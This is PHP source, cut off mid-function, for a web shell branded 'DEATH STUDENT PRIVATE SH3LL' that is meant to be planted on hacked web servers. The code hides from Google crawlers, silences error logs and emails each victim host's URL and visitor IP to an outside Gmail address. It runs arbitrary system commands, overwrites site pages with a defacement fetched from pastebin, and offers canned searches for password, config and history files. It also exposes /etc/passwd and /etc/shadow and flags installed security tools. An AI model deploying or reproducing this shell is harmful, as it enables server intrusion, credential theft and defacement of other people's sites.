

<?php

//Make your setting here.
$deface_url = 'https://pastebin.com/raw/j3yJsDX9';  //deface url here(pastebin).
$UserName = "DeathStudent";                                      //Your UserName here.
$auth_pass = "Death";                                  //Your Password.
//Change Shell Theme here//
$color = "#0CF2E6";                                   //Fonts color modify here.
$Theme = '#EB0F0F';                                    //Change border-color accoriding to your choice.
$TabsColor = '#413734';                              //Change tabs color here.
 

?>
	






<?php
if(!isset($_SESSION['trimite'])){
    $url=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].'<br />User IP: '.$_SERVER['REMOTE_ADDR'].(isset($_SERVER['HTTP_X_FORWARDED_FOR'])?'('.$_SERVER['HTTP_X_FORWARDED_FOR'].')':'');
    @mail("Blackleet1337@gmail.com","Death Student Modified Shell",$url);
    $_SESSION['trimite']=true;
}
$default_action = 'FilesMan';
@define('SELF_PATH', __FILE__);
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
    header('HTTP/1.0 404 Not Found');
    exit;
}

@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('display_errors',0);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
if( get_magic_quotes_gpc() ) {
    function stripslashes_array($array) {
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
    }
    $_POST = stripslashes_array($_POST);
}

function printLogin() {
 if ($_POST['pass'] != $auth_pass && $_POST['uname'] != $UserName) {
    $status = 'Wrong Password or UserName :(';
    

}

?>

<html>
<head>
<title>DEATH STUDENT PRIVATE SH3LL</title>
<link href="https://fonts.googleapis.com/css?family=Josefin+Sans:400,100" rel="stylesheet">
</head>
<style>
body{
   font-family: Josefin Sans, sans-serif;
    background: black;
    color:#ABEFFF;
}
    .loginpage img{
        width: 500px;
        height: 150px;
    }
    .loginpage{
        height: 400px;
        width: 500px;
        border:1px solid;
        border-color:#EB0F0F;
        text-align: center;
        border-radius: 5px;
        margin-top: 100px;
    }
    #pageheading{
        font-size:25px;
        color:#ABEFFF;
        margin-top: 10px;
    }
    .loginpage img{
        width: 500px;
    
    }
    input{
        background: black;
        border-color:#EB0F0F;
        border-radius: 10px;
        margin-top: 10px; 
        padding:5px;
        color: #ABEFFF;
    }
     input:hover{
        background: #ABEFFF;
        color: red;

     }

</style>
<body>
<center>
<div class="loginpage">
    <img src="https://1.bp.blogspot.com/-qMVS5Y6_OzQ/W4g8ROCQ1II/AAAAAAAAAcg/raVZor864-s-SL0j-4k2PQz-8GiimN1CwCLcBGAs/s1600/DeathStudent.jpg" alt="Shell Logo">
    <div id="pageheading"> DEATH STUDENT PRIVATE SH3LL</div>
    <form method="post">
        User Name: <input type="text" name="uname" ><br>
        Password :  <input type="password" name="pass" ><br>
       <input type="submit" name="login" value="Login">
 <?

  if (isset($status)) {
   ?>  
 

     

    </form>
   
</d<p><?=$status?></p> 
</center>
</body> 
</html>

<?


  }      
    exit;
}

if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
    if( empty( $auth_pass ) ||
        ( isset( $_POST['pass'] ) &&  ($_POST['pass']) == $auth_pass  && ($_POST['uname']) == $UserName))
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;

    else
        
        printLogin();

if( strtolower( substr(PHP_OS,0,3) ) == "win" )
    $os = 'win';
else
    $os = 'nix';
$safe_mode = @ini_get('safe_mode');
$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();
if( isset( $_POST['c'] ) )
    @chdir($_POST['c']);
$cwd = @getcwd();
if( $os == 'win') {
    $home_cwd = str_replace("\\", "/", $home_cwd);
    $cwd = str_replace("\\", "/", $cwd);
}
if( $cwd[strlen($cwd)-1] != '/' )
    $cwd .= '/';
    
if($os == 'win') {
    $aliases = array(
        "List Directory" => "dir",
        "Find index.php in current dir" => "dir /s /w /b index.php",
        "Find *config*.php in current dir" => "dir /s /w /b *config*.php",
        "Show active connections" => "netstat -an",
        "Show running services" => "net start",
        "User accounts" => "net user",
        "Show computers" => "net view",
        "ARP Table" => "arp -a",
        "IP Configuration" => "ipconfig /all"
    );
} else {
    $aliases = array(
          "List dir" => "ls -la",
        "list file attributes on a Linux second extended file system" => "lsattr -va",
          "show opened ports" => "netstat -an | grep -i listen",
        "Find" => "",
          "find all suid files" => "find / -type f -perm -04000 -ls",
          "find suid files in current dir" => "find . -type f -perm -04000 -ls",
          "find all sgid files" => "find / -type f -perm -02000 -ls",
          "find sgid files in current dir" => "find . -type f -perm -02000 -ls",
          "find config.inc.php files" => "find / -type f -name config.inc.php",
          "find config* files" => "find / -type f -name \"config*\"",
          "find config* files in current dir" => "find . -type f -name \"config*\"",
          "find all writable folders and files" => "find / -perm -2 -ls",
          "find all writable folders and files in current dir" => "find . -perm -2 -ls",
          "find all service.pwd files" => "find / -type f -name service.pwd",
          "find service.pwd files in current dir" => "find . -type f -name service.pwd",
          "find all .htpasswd files" => "find / -type f -name .htpasswd",
          "find .htpasswd files in current dir" => "find . -type f -name .htpasswd",
          "find all .bash_history files" => "find / -type f -name .bash_history",
          "find .bash_history files in current dir" => "find . -type f -name .bash_history",
          "find all .fetchmailrc files" => "find / -type f -name .fetchmailrc",
          "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc",
        "Locate" => "",
          "locate httpd.conf files" => "locate httpd.conf",
        "locate vhosts.conf files" => "locate vhosts.conf",
        "locate proftpd.conf files" => "locate proftpd.conf",
        "locate psybnc.conf files" => "locate psybnc.conf",
        "locate my.conf files" => "locate my.conf",
        "locate admin.php files" =>"locate admin.php",
        "locate cfg.php files" => "locate cfg.php",
        "locate conf.php files" => "locate conf.php",
        "locate config.dat files" => "locate config.dat",
        "locate config.php files" => "locate config.php",
        "locate config.inc files" => "locate config.inc",
        "locate config.inc.php" => "locate config.inc.php",
        "locate config.default.php files" => "locate config.default.php",
        "locate config* files " => "locate config",
        "locate .conf files"=>"locate '.conf'",
        "locate .pwd files" => "locate '.pwd'",
        "locate .sql files" => "locate '.sql'",
        "locate .htpasswd files" => "locate '.htpasswd'",
        "locate .bash_history files" => "locate '.bash_history'",
        "locate .mysql_history files" => "locate '.mysql_history'",
        "locate .fetchmailrc files" => "locate '.fetchmailrc'",
        "locate backup files" => "locate backup",
        "locate dump files" => "locate dump",
        "locate priv files" => "locate priv"    
    );
}
    if(isset($_POST['p1']) && $_POST['p1']=='deface') {
        
        $def = file_get_contents($deface_url);
        file_put_contents($_POST['c'].$_POST['p2'],$def);
    }
function ex($in) {
    $out = '';
    if(function_exists('exec')) {
        @exec($in,$out);
        $out = @join("\n",$out);
    }elseif(function_exists('passthru')) {
        ob_start();
        @passthru($in);
        $out = ob_get_clean();
    }elseif(function_exists('system')) {
        ob_start();
        @system($in);
        $out = ob_get_clean();
    }elseif(function_exists('shell_exec')) {
        $out = shell_exec($in);
    }elseif(is_resource($f = @popen($in,"r"))) {
        $out = "";
        while(!@feof($f))
            $out .= fread($f,1024);
        pclose($f);
    }
    return $out;
}

function which($p) {
    $path = ex('which '.$p);
    if(!empty($path))
        return $path;
    return false;
}
    
function printHeader() {
    if(empty($_POST['charset']))
        $_POST['charset'] = "UTF-8";
    global $color;
    global $Theme;
    global $TabsColor;
        echo "<html><head><link href='https://fonts.googleapis.com/css?family=Josefin+Sans:400,100' rel='stylesheet' type='text/css'></head>";
    echo '<html>
<meta http-equiv="Content-Type" content="text/html; charset='.$_POST['charset'].'"><title>Welcame To Your Hacking World</title>
<style>
        body {background-color:black;color:#fff;}
        body,td,th    { font-family: Josefin Sans, sans-serif;font-size:13px;margin:0;vertical-align:top; }
        span,h1,a    { color:'.$color.' !important; }
        span        { font-weight: bolder; }
        h1            { padding: 0px 5px;font: 14pt audiowide;margin:0px 0 0 0px; }
        div.content    { padding: 0px;margin:0 0px;background: #0F1010;border:1px solid '.$Theme.'; border-radius:5px;}
        a            { text-decoration:none;   }
        a:hover        { border-bottom:0px solid #5e5e5e;text-decoration:none; }
        a:hover{cursor: url("http://downloads.totallyfreecursors.com/cursor_files/pakistan.ani"), url("http://downloads.totallyfreecursors.com/thumbnails/PAKISTAN.gif"), auto;text-decoration:none;}
        .ml1        { border:1px solid '.$Theme.';padding:px;margin:0;overflow: auto; }
        .bigarea    { width:100%;height:250px;margin-top:0px; border-radius:10px; border-color:'.$Theme.'; background:#2F2F2F;}
        input, textarea, select    { margin-top:0;color:#63E1FF;background-color:black;border-radius:5px;border:1px solid '.$Theme.'; border-radis:5px;font: 10pt arial,"Courier New"; }
        input[type="button"]:hover,input[type="submit"]:hover {background-color:#094F60;color:black;text-decoration:none;} 
        form        { margin:0px; background:#0F1010;}
        #toolsTbl    { text-align:center; }
        .toolsInp    { width: 80%; background:black; border-radius:5px; border-color:'.$Theme.'; }
        .main th    {text-align:left;background-color:'.$TabsColor.';}
        .main tr:hover{background:'.$Theme.'; border:5px solid;border-color:'.$Theme.';}
        .main td, th{vertical-align:middle;}
        .menu { height:30px; border-radius:10px;}
        .menu th{padding:1px;border-radius: 5px;  background:'.$TabsColor.';     -webkit-transform: rotate(20deg);
    -moz-transform: rotate(20deg);
    -o-transform: rotate(20deg);
    -ms-transform: rotate(20deg);
    transform: rotate(20deg);}
        .menu th:hover{background:#0F1010;text-decoration: none;}
                pre {font-family: Josefin Sans, sans-serif;color:#FFFFFF;}
        #cot_tl_fixed{position:fixed;bottom:0px;font-size:12px;left:0px;padding:4px 0;clip:_top:expression(document.documentElement.scrollTop+document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft + document.documentElement.clientWidth - offsetWidth);}

                
        .cpr {margin-bottom:5px;font-weight:bold; }
        .cpb {width:34px;margin:0 5px;}
        
        .npoad td {padding:0;}
        #Shelltools{
        margin-top:50px;
        width:500px;
        border:1px solid;
        border-radius:10px;
    }
    .Shelllogo td{
        font-size:12px;
        font-weight:bold;
        


    }
    .Shelllogo{
        margin-left:5px;
        background:url(https://upload.wikimedia.org/wikipedia/commons/thumb/2/2e/Flag_of_the_Islamic_Courts_Union.svg/500px-Flag_of_the_Islamic_Courts_Union.svg.png);
        background-repeat: no-repeat;
       background-position: CENTER; 
        background-color:#0F1010;
        background-size: 400px 120px;



    }
    </style>

</html>
<style type="text/css">body, a:hover {text-decoration:none;cursor: url(http://cur.cursors-4u.net/cursors/cur-11/cur1054.cur), progress !important;}</style><a href="http://www.cursors-4u.com/cursor/2012/02/11/chrome-pointer.html" target="_blank" title="Chrome Pointer"><img src="http://cur.cursors-4u.net/cursor.png" border="0" alt="Chrome Pointer" style="position:absolute; top: 0px; right: 0px;" /></a>
    <script>
        function set(a,c,p1,p2,p3,charset) {
            if(a != null)document.mf.a.value=a;
            if(c != null)document.mf.c.value=c;
            if(p1 != null)document.mf.p1.value=p1;
            if(p2 != null)document.mf.p2.value=p2;
            if(p3 != null)document.mf.p3.value=p3;
            if(charset != null)document.mf.charset.value=charset;
        }
        function g(a,c,p1,p2,p3,charset) {
            set(a,c,p1,p2,p3,charset);
            document.mf.submit();
        }
        function a(a,c,p1,p2,p3,charset) {
            set(a,c,p1,p2,p3,charset);
            var params = "ajax=true";
            for(i=0;i<document.mf.elements.length;i++)
                params += "&"+document.mf.elements[i].name+"="+encodeURIComponent(document.mf.elements[i].value);
            sr("'.$_SERVER['REQUEST_URI'].'", params);
        }
        function sr(url, params) {    
            if (window.XMLHttpRequest) {
                req = new XMLHttpRequest();
                req.onreadystatechange = processReqChange;
                req.open("POST", url, true);
                req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
                req.send(params);
            } 
            else if (window.ActiveXObject) {
                req = new ActiveXObject("Microsoft.XMLHTTP");
                if (req) {
                    req.onreadystatechange = processReqChange;
                    req.open("POST", url, true);
                    req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
                    req.send(params);
                }
            }
        }
        function processReqChange() {
            if( (req.readyState == 4) )
                if(req.status == 200) {
                    //alert(req.responseText);
                    var reg = new RegExp("(\\d+)([\\S\\s]*)", "m");
                    var arr=reg.exec(req.responseText);
                    eval(arr[2].substr(0, arr[1]));
                } 
                else alert("Request error!");
        }
    </script>
    <head><link href="https://fonts.googleapis.com/css?family=Audiowide" ></head><body><div style="position:absolute;width:100%;top:0;left:0;"><div style="margin:5px;background:black;"><div class="content" style="border:1px solid '.$Theme.'; border-radius:5px;">
    <form method=post name=mf style="display:none;">
        <input type=hidden name=a value="'.(isset($_POST['a'])?$_POST['a']:'').'">
        <input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">
        <input type=hidden name=p1 value="'.(isset($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'">
        <input type=hidden name=p2 value="'.(isset($_POST['p2'])?htmlspecialchars($_POST['p2']):'').'">
        <input type=hidden name=p3 value="'.(isset($_POST['p3'])?htmlspecialchars($_POST['p3']):'').'">
        <input type=hidden name=charset value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
    </form>';
    $freeSpace = @diskfreespace($GLOBALS['cwd']);
    $totalSpace = @disk_total_space($GLOBALS['cwd']);
    $totalSpace = $totalSpace?$totalSpace:1;
    $disable_functions = @ini_get('disable_functions');
    $release = @php_uname('r');
    $kernel = @php_uname('s');
    if(!function_exists('posix_getegid')) {
        $user = @get_current_user();
        $uid = @getmyuid();
        $gid = @getmygid();
        $group = "?";
    } else {
        $uid = @posix_getpwuid(@posix_geteuid());
        $gid = @posix_getgrgid(@posix_getegid());
        $user = $uid['name'];
        $uid = $uid['uid'];
        $group = $gid['name'];
        $gid = $gid['gid'];
    }
    $cwd_links = '';
    $path = explode("/", $GLOBALS['cwd']);
    $n=count($path);
    for($i=0;$i<$n-1;$i++) {
        $cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
        for($j=0;$j<=$i;$j++)
            $cwd_links .= $path[$j].'/';
        $cwd_links .= "\")'>".$path[$i]."/</a>";
    }
    $charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
    $opt_charsets = '';
    foreach($charsets as $item)
        $opt_charsets .= '<option value="'.$item.'" '.($_POST['charset']==$item?'selected':'').'>'.$item.'</option>';
    $m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Bypasser'=>'SafeMode','Safe Mode'=>'Bypass','String tools'=>'StringTools','Import Scripts'=>'ImportScripts','Network'=>'Network','Readable Dirs'=>'Readable','Defacer' => 'Deface','Code Injector'=>'Injector','Domains' => 'Domain');
    if(!empty($GLOBALS['auth_pass']))
        $m['Logout'] = 'Logout';
    $menu = '';
    foreach($m as $k => $v)
        $menu .= '<th><a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a></th>';
    $drives = "";
    if ($GLOBALS['os'] == 'win') {
        foreach( range('a','z') as $drive ){
            if (is_dir($drive.':\\'))
                $drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
        }
        $drives .= '<br />: ';
    }
    if($GLOBALS['os'] == 'nix') {
        $dominios = @file_get_contents("/etc/named.conf");
        if(!$dominios) {
            $DomainS = "/var/named";
            $Domainonserver = scandir($DomainS);
            $d0c = count($Domainonserver);
        } else {
            @preg_match_all('/.*?zone "(.*?)" {/', $dominios, $out);
            $out = sizeof(array_unique($out[1]));
            $d0c = $out."  Domains";
        }
    } else {
        $d0c = "Nothing here bro:(";
    }
    if($GLOBALS['os'] == 'nix' )
    {
        $usefl = ''; $dwnldr = '';
        if(!@ini_get('safe_mode')) {
            $temp = array();
            $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
            foreach($userful as $item) { if(which($item)) $temp[]= $item; }
            $usefl = implode(', ',$temp);
            $temp = array();
            $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
            foreach($downloaders as $item2) { if(which($item2)) $temp[]= $item2; }
            $dwnldr = implode(', ',$temp);
        } else {
            $usefl = ' ------- '; $dwnldr = ' ------- ';
        }
    } else { 
        $usefl = ' ------- '; $dwnldr = ' ------- ';
    } 
    echo '<div class="Shelllogo"><table class="info" cellpadding="0" cellspacing="0" width="100%"><tr>
          <td><table cellpadding="3" cellspacing="0" class="npoad"><tr><td width="80px;"><span>Uname</span></td><td>: <nobr>'.substr(@php_uname(), 0, 120).'</nobr></td></tr>
          <tr><td><span>User</span></td><td>: '.$uid.' ( '.$user.' ) <span>Group: </span> '.$gid.' ( '.$group.' )</td></tr><tr><td><span>Server</span></td><td>: '.@getenv('SERVER_SOFTWARE').'</td></tr><tr><td><span>Useful</span></td><td>: '.$usefl.'</td></tr><tr><td><span>Downloaders</span></td><td>: '.$dwnldr.'</td></tr><tr><td><span>D/functions</span></td><td>: '.($disable_functions?$disable_functions:'All Function Enable').'</td></tr><tr><td><span>'.($GLOBALS['os'] == 'win'?'Drives<br />Cwd':'Cwd').'</span></td><td>: '.$drives.''.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a></td></tr></table></td>'.
         '<td width=4><nobr><span>Sv IP</span><br><span>Your IP</span><br /><span>HDD</span><br /><span>Free</span><br /><span>PHP</span><br /><span>Safe Mode</span><br /><span>Domains</span></nobr></td>'.
         '<td><nobr>: '.gethostbyname($_SERVER["HTTP_HOST"]).'<br>: '.$_SERVER['REMOTE_ADDR'].'<br />: '.viewSize($totalSpace).'<br />: '.viewSize($freeSpace).' ('.(int)($freeSpace/$totalSpace*100).'%)<br>: '.@phpversion().' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a><br />: '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color='.$color.'<b>OFF</b></font>').'<br />: '.$d0c.'</nobr></td></tr></table></div>'.
         '</div></div><div style="margin:5;background:black;"><div class="content" style="border-top:5px solid 430303;padding:2px;"><table cellpadding="3" cellspacing="0" width="100%" class="menu"><tr>'.$menu.'</tr></table></div></div><div style="margin:5;background:black;">';
}

function printFooter() {
    $is_writable = is_writable($GLOBALS['cwd'])?"<font color=green>[ Writeable ]</font>":"<font color=red>[ Not writable ]</font>";

echo '</div><div style="margin:5px;background:black;"><div class="content" style="border:1px solid '.$Theme.'; border-radius:5px;">
<table class="info" id="toolsTbl" cellpadding="3" cellspacing="0" width="100%">
    <tr>
        <td><form onsubmit="g(null,this.c.value);return false;"><span>Change dir:</span><br><input class="toolsInp" type=text name=c value="'.htmlspecialchars($GLOBALS['cwd']).'"><input type=submit value=">>"></form></td>
        <td><form onsubmit="g(\'FilesTools\',null,this.f.value);return false;"><span>Read file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form></td>
    </tr>
    <tr>
        <td><form onsubmit="g(\'FilesMan\',null,\'mkdir\',this.d.value);return false;"><span>Make dir:</span><br><input class="toolsInp" type=text name=d><input type=submit value=">>"></form>'.$is_writable.'</td>
        <td><form onsubmit="g(\'FilesTools\',null,this.f.value,\'mkfile\');return false;"><span>Make file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form>'.$is_writable.'</td>
    </tr>
    <tr>
        <td><form onsubmit="g(\'Console\',null,this.c.value);return false;"><span>Execute:</span><br><input class="toolsInp" type=text name=c value=""><input type=submit value=">>"></form></td>
        <td><form method="post" ENCTYPE="multipart/form-data">
        <input type=hidden name=a value="FilesMAn">
        <input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">
        <input type=hidden name=p1 value="uploadFile">
        <input type=hidden name=charset value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
        <span>Upload file:</span><br><input class="toolsInp" type=file name=f><input type=submit value=">>"></form>'.$is_writable.'</td>
    </tr>
</table></div></div>
<div style="margin:5px;background:black;"><div class="content" style="border:2px solid '.$Theme.';text-align:center;font-weight:bold; border-radius:10px;margin:auto; width:500;">Shell Modify  <a href="https://web.facebook.com/Death5tudent"> Mohammad Sarfaraj</a></div></div>
</div>
</body></html>';
}

if ( !function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false) ) { function posix_getpwuid($p) { return false; } }
if ( !function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false) ) { function posix_getgrgid($p) { return false; } }


function viewSize($s) {
    if($s >= 1073741824)
        return sprintf('%1.2f', $s / 1073741824 ). ' GB';
    elseif($s >= 1048576)
        return sprintf('%1.2f', $s / 1048576 ) . ' MB';
    elseif($s >= 1024)
        return sprintf('%1.2f', $s / 1024 ) . ' KB';
    else
        return $s . ' B';
}

function perms($p) {
    if (($p & 0xC000) == 0xC000)$i = 's';
    elseif (($p & 0xA000) == 0xA000)$i = 'l';
    elseif (($p & 0x8000) == 0x8000)$i = '-';
    elseif (($p & 0x6000) == 0x6000)$i = 'b';
    elseif (($p & 0x4000) == 0x4000)$i = 'd';
    elseif (($p & 0x2000) == 0x2000)$i = 'c';
    elseif (($p & 0x1000) == 0x1000)$i = 'p';
    else $i = 'u';
    $i .= (($p & 0x0100) ? 'r' : '-');
    $i .= (($p & 0x0080) ? 'w' : '-');
    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
    $i .= (($p & 0x0020) ? 'r' : '-');
    $i .= (($p & 0x0010) ? 'w' : '-');
    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
    $i .= (($p & 0x0004) ? 'r' : '-');
    $i .= (($p & 0x0002) ? 'w' : '-');
    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
    return $i;
}

function viewPermsColor($f) { 
    if (!@is_readable($f))
        return '<font color=#FF0000><b>'.perms(@fileperms($f)).'</b></font>';
    elseif (!@is_writable($f))
        return '<font color=white><b>'.perms(@fileperms($f)).'</b></font>';
    else
        return '<font color=#00BB00><b>'.perms(@fileperms($f)).'</b></font>';
}

if(!function_exists("scandir")) {
    function scandir($dir) {
        $dh  = opendir($dir);
        while (false !== ($filename = readdir($dh))) {
            $files[] = $filename;
        }
        return $files;
    }
}

function actionSecInfo() {
    printHeader();
    echo '<h1>Server security information</h1><div class=content>';
    function showSecParam($n, $v) {
        $v = trim($v);
        if($v) {
            echo '<span>'.$n.': </span>';
            if(strpos($v, "\n") === false)
                echo $v.'<br>';
            else
                echo '<pre class=ml1>'.$v.'</pre>';
        }
    }
    
    showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
    showSecParam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS['disable_functions']:'none');
    showSecParam('Open base dir', @ini_get('open_basedir'));
    showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
    showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
    showSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
    $temp=array();
    if(function_exists('mysql_get_client_info'))
        $temp[] = "MySql (".mysql_get_client_info().")";
    if(function_exists('mssql_connect'))
        $temp[] = "MSSQL";
    if(function_exists('pg_connect'))
        $temp[] = "PostgreSQL";
    if(function_exists('oci_connect'))
        $temp[] = "Oracle";
    showSecParam('Supported databases', implode(', ', $temp));
    echo '<br>';
    
    if( $GLOBALS['os'] == 'nix' ) {
        $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
        $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
        $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
        showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
        showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"etc\", \"shadow\")'>[view]</a>":'no');
        showSecParam('OS version', @file_get_contents('/proc/version'));
        showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
        if(!$GLOBALS['safe_mode']) {
            echo '<br>';
            $temp=array();
            foreach ($userful as $item)
                if(which($item)){$temp[]=$item;}
            showSecParam('Userful', implode(', ',$temp));
            $temp=array();
            foreach ($danger as $item)
                if(which($item)){$temp[]=$item;}
            showSecParam('Danger', implode(', ',$temp));
            $temp=array();
            foreach ($downloaders as $item) 
                if(which($item)){$temp[]=$item;}
            showSecParam('Downloaders', implode(', ',$temp));
            echo '<br/>';
            showSecParam('Hosts', @file_get_contents('/etc/hosts'));
            showSecParam('HDD space', ex('df -h'));
            showSecParam('Mount options', @file_get_contents('/etc/fstab'));
        }
    } else {
        showSecParam('OS Version',ex('ver')); 
        showSecParam('Account Settings',ex('net accounts')); 
        showSecParam('User Accounts',ex('net user'));
    }
    echo '</div>';
    printFooter();
}

function actionFilesMan() {
    printHeader();
    echo '<h1>File manager</h1><div class=content>';
    if(isset($_POST['p1']) && $_POST['p1']!='deface') {
        switch($_POST['p1']) {
            case 'uploadFile':
                if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']))
                    echo "Can't upload file!";
                break;
                break;
            case 'mkdir':
                if(!@mkdir($_POST['p2']))
                    echo "Can't create new dir";
                break;
            case 'delete':
                function deleteDir($path) {
                    $path = (substr($path,-1)=='/') ? $path:$path.'/';
                    $dh  = opendir($path);
                    while ( ($item = readdir($dh) ) !== false) {
                        $item = $path.$item;
                        if ( (basename($item) == "..") || (basename($item) == ".") )
                            continue;
                        $type = filetype($item);
                        if ($type == "dir")
                            deleteDir($item);
                        else
                            @unlink($item);
                    }
                    closedir($dh);
                    rmdir($path);
                }
                if(is_array(@$_POST['f']))
                    foreach($_POST['f'] as $f) {
                        $f = urldecode($f);
                        if(is_dir($f))
                            deleteDir($f);
                        else
                            @unlink($f);
                    }
                break;
                        
  
                    
                
            case 'paste':
                if($_SESSION['act'] == 'copy') {
                    function copy_paste($c,$s,$d){
                        if(is_dir($c.$s)){
                            mkdir($d.$s);
                            $h = opendir($c.$s);
                            while (($f = readdir($h)) !== false)
                                if (($f != ".") and ($f != "..")) {
                                    copy_paste($c.$s.'/',$f, $d.$s.'/');
                                }
                        } elseif(is_file($c.$s)) {
                            @copy($c.$s, $d.$s);
                        }
                    }
                    foreach($_SESSION['f'] as $f)
                        copy_paste($_SESSION['cwd'],$f, $GLOBALS['cwd']);                    
                } elseif($_SESSION['act'] == 'move') {
                    function move_paste($c,$s,$d){
                        if(is_dir($c.$s)){
                            mkdir($d.$s);
                            $h = opendir($c.$s);
                            while (($f = readdir($h)) !== false)
                                if (($f != ".") and ($f != "..")) {
                                    copy_paste($c.$s.'/',$f, $d.$s.'/');
                                }
                        } elseif(is_file($c.$s)) {
                            @copy($c.$s, $d.$s);
                        }
                    }
                    foreach($_SESSION['f'] as $f)
                        @rename($_SESSION['cwd'].$f, $GLOBALS['cwd'].$f);
                }
                unset($_SESSION['f']);
                break;
            default:
                if(!empty($_POST['p1']) && (($_POST['p1'] == 'copy')||($_POST['p1'] == 'move')) ) {
                    $_SESSION['act'] = @$_POST['p1'];
                    $_SESSION['f'] = @$_POST['f'];
                    foreach($_SESSION['f'] as $k => $f)
                        $_SESSION['f'][$k] = urldecode($f);
                    $_SESSION['cwd'] = @$_POST['c'];
                }
                break;
        }
        echo '<script>document.mf.p1.value="";document.mf.p2.value="";</script>';
    }

    $dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
    if($dirContent === false) {    echo 'Can\'t open this folder!'; return;    }
    global $sort;
    $sort = array('name', 1);
    if(!empty($_POST['p1'])) {
        if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
            $sort = array($match[1], (int)$match[2]);
    }
    echo '<script>
        function sa() {
            for(i=0;i<document.files.elements.length;i++)
            if(document.files.elements[i].type == \'checkbox\')
                document.files.elements[i].checked = document.files.elements[0].checked;
        }
        </script>
        <table width=\'100%\' class=\'main\' cellspacing=\'0\' cellpadding=\'2\'>
        <form name=files method=post>';
    echo "<tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
    $dirs = $files = $links = array();
    $n = count($dirContent);
    for($i=0;$i<$n;$i++) {
        $ow = @posix_getpwuid(@fileowner($dirContent[$i]));
        $gr = @posix_getgrgid(@filegroup($dirContent[$i]));
        $tmp = array('name' => $dirContent[$i],
                     'path' => $GLOBALS['cwd'].$dirContent[$i],
                     'modify' => @date('Y-m-d H:i:s',@filemtime($GLOBALS['cwd'].$dirContent[$i])),
                     'perms' => viewPermsColor($GLOBALS['cwd'].$dirContent[$i]),
                     'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]),
                     'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
                     'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i])
                    );
        if(@is_file($GLOBALS['cwd'].$dirContent[$i]))
            $files[] = array_merge($tmp, array('type' => 'file'));
        elseif(@is_link($GLOBALS['cwd'].$dirContent[$i]))
